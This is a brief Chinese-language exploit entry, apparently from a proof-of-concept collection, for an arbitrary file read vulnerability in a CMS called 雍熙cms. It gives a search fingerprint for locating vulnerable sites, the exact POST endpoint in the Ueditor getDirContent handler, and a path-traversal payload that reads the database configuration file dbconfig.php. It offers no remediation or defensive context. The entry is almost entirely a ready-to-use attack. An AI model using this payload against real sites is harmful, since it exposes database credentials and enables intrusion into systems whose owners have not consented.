# 雍熙cmsindex任意文件读取漏洞

雍熙cmsindex ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="g_sybannr"`
- **请求**：`POST /index.php?s=/Yongsylogin/Ueditor/getDirContent HTTP/1.1`

**Payload**
```
filename=../../Apps/Common/Conf/dbconfig.php&type=1
```
- **响应特征**：200